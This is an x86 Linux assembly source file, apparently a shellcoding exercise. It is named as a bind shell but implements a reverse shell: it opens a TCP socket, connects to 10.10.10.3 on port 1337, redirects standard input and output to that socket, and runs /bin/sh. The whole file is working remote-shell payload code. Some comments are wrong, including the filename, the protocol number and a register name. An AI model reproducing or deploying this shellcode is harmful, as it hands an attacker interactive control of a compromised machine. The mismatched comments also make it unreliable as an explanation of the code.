	; Filename: bind_shell.nasm



global _start

	; | EAX | system call numer ( + return data ) |
	; | EBX | 1st |
	; | ECX | 2nd |
	; | EDX | 3rd |
	; | ESI | 4th |
	; | EDI | 5th |
	; | EBP | 6th |

section .text
_start:

	; Create socket
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; syscall: int socketcall(int call, unsigned long *args)	;
	mov bl, 0x1			; int socket(int domain, int type, int protocol)	;

						; *args: push in reverse order to stack
	push 0x6			; protocol: IPPROTO_TCP (2)
	push 0x1			; type = SOCK_STREAM (1)
	push 0x2			; domain = AF_INET (2)
	mov ecx, esp
	int 0x80

	mov edi, eax 		; store socket ptr to edi in edx




	; connect
	xor eax, eax
	xor ebx, ebx


	mov al, 0x66	    ; syscall: int socketcall(int call, unsigned long *args)	;
	mov bl, 0x3			; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

	push 0x030a0a0a		; IP = 10.10.10.3 (little endian)
	push word 0x3905		; num = '1337' (little endian)

	push word 0x02		; address family: AF_INET (2)

	mov ecx, esp
	push byte 0x10
	push ecx
	push edi

	mov ecx, esp

	int 0x80




	; REDIRECT I/O
	; file descriptor : fd = (stdin = 0, stdout = 1, stderr = 2)
	; Will loop through all 3 file descriptors and redirct output to socket

	; dup2
	mov ebx, edi		; mov file descriptor for socket to ebx

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter (for loop)
	
loop:				
	mov al, 0x3f		; syscall: dup2 (63)  -- NOTE: eax was cleared above. Good to reduce # of instructions.
	int 0x80			; exec dup2
	dec ecx				; decrement counter
	jns loop			; jump until SF is set ; (jmp if positive)


	; Execute /bin/sh
	mov al, 0xb			; syscall: execve (11) int execve(const char *pathname, char *const argv[], char *const envp[]);

	xor edx, edx		; envp (NULL)
	push edx			; push 0x00 null terminator for string
	push 0x68732f2f		; "hs//"   LITTLE ENDIAN
	push 0x6e69622f 	; "nib/"


	mov ebx, esp		; pathname: point ebx to stack
	mov ecx, edx		; NULL

	int 0x80			; execute execve

